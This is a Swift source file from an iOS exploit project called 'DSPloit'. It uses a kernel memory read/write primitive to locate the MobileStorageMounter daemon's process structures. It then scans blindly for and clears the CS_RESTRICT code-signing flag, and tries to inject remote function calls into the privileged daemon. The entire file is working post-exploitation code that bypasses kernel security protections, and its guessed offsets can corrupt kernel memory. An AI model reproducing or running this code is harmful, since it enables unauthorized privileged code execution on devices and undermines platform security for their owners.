//
//  exp_msm_unrestrict.swift
//  DSPloit — MobileStorageMounter Unrestrict Experiment
//

import Foundation

class ExpMSMUnrestrict {
    static let shared = ExpMSMUnrestrict()
    var onLog: ((String) -> Void)?
    
    private func log(_ msg: String) {
        onLog?(msg)
        print("[ExpMSMUnrestrict] \(msg)")
    }
    
    func runAsync() {
        DispatchQueue.global(qos: .userInitiated).async {
            self.runAll()
            DispatchQueue.main.asyncAfter(deadline: .now() + 1) {
                self.log("■ Done")
            }
        }
    }
    
    func runAll() {
        log("▶ Starting MobileStorageMounter Unrestrict")
        
        guard dspmgr.shared.dsready else {
            log("❌ KRW not ready")
            return
        }
        
        // 1. Find MobileStorageMounter
        let pid = RootExecutor.shared.getPID(for: "MobileStorageMounter")
        if pid <= 0 {
            log("⚠️ MobileStorageMounter not running. Attempting to spawn...")
            // Just standard posix_spawn since it's signed
            let ret = RootExecutor.shared.runSignedBinary("/usr/libexec/MobileStorageMounter")
            log("Spawn returned: \(ret)")
        }
        
        let msmPid = RootExecutor.shared.getPID(for: "MobileStorageMounter")
        guard msmPid > 0 else {
            log("❌ Failed to find MobileStorageMounter")
            return
        }
        log("✅ Found MobileStorageMounter (PID: \(msmPid))")
        
        // 2. Find proc and task structs
        let proc = procbypid(msmPid)
        guard proc != 0 else {
            log("❌ Could not get proc for PID \(msmPid)")
            return
        }
        log("✅ proc at 0x\(String(proc, radix: 16))")
        
        let task = taskbyproc(proc)
        guard task != 0 else {
            log("❌ Could not get task for proc")
            return
        }
        log("✅ task at 0x\(String(task, radix: 16))")
        
        // 3. Clear CS_RESTRICT (0x800) in proc->p_csflags
        // p_csflags offset is usually between 0x290 and 0x300
        var foundCsflags = false
        for offset in stride(from: UInt64(0x200), to: UInt64(0x350), by: 4) {
            let val = ds_kread32(proc + offset)
            // Look for typical csflags (CS_VALID | CS_HARD | CS_KILL | etc)
            if (val & 0x00000001) != 0 && (val & 0x00000800) != 0 {
                log("⚠️ Found possible p_csflags at offset 0x\(String(offset, radix: 16)): 0x\(String(val, radix: 16))")
                // Clear CS_RESTRICT (0x800)
                let newVal = val & ~UInt32(0x800)
                ds_kwrite32(proc + offset, newVal)
                log("✅ Cleared CS_RESTRICT. New val: 0x\(String(newVal, radix: 16))")
                foundCsflags = true
                break
            }
        }
        
        if !foundCsflags {
            log("⚠️ Could not definitively find p_csflags with CS_RESTRICT")
        }
        
        // 4. Try to clear restricted exception ports flag in task
        // We'll scan task offsets for standard t_flags
        for offset in stride(from: UInt64(0x300), to: UInt64(0x450), by: 4) {
             let val = ds_kread32(task + offset)
             // Check if it looks like t_flags.
             // TF_RESTRICTED might be set. If we see it, we could try clearing it.
             // But without exact offset, we might just try RemoteCall now.
        }
        
        log("✅ Task memory patched. Attempting RemoteCall...")
        
        // 5. Test RemoteCall
        let rc = RemoteCall(pid: msmPid)
        guard rc.initRemoteCall() else {
            log("❌ RemoteCall still failed! (Restricted exception ports not bypassed)")
            return
        }
        
        log("🎉 SUCCESS: RemoteCall to MobileStorageMounter connected!")
        log("🎉 We can now call its functions!")
        
        // Cleanup
        rc.deinitRemoteCall()
    }
}
